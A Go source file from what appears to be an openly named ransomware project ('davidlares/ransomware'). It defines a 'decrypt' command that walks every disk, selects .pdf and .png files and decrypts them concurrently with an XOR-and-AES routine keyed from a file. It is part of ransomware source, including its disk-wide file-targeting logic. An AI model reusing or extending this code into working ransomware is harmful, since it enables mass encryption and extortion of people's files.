package cmd

import (
	"davidlares/ransomware/decrypt"
	"davidlares/ransomware/mapper"

	"github.com/spf13/cobra"
)

var decryptCmd = &cobra.Command{
	Use:   "decrypt",
	Short: "Decrypt functionality",
	Long:  `Decrypt functionality built with GoLang.`,
	Run: func(cmd *cobra.Command, args []string) {
		// control
		decryptControl := make(chan struct{}, 10)
		// disks listing
		disk := mapper.ListingDisks()
		// looping
		for _, disk := range disk {
			files := mapper.MapFiles(disk, []string{".pdf", ".png"})
			for _, file := range files {
				// adding to waitgroup
				mapper.Wg.Add(1)
				// decrypt control
				decryptControl <- struct{}{}
				go decrypt.DecryptWithXorAndAES(file, "aes_key.txt", decryptControl)
			}
		}
		mapper.Wg.Wait()
	},
}

// adding child commands to the encrypt command (= flags)
func init() {
	rootCmd.AddCommand(decryptCmd)
}
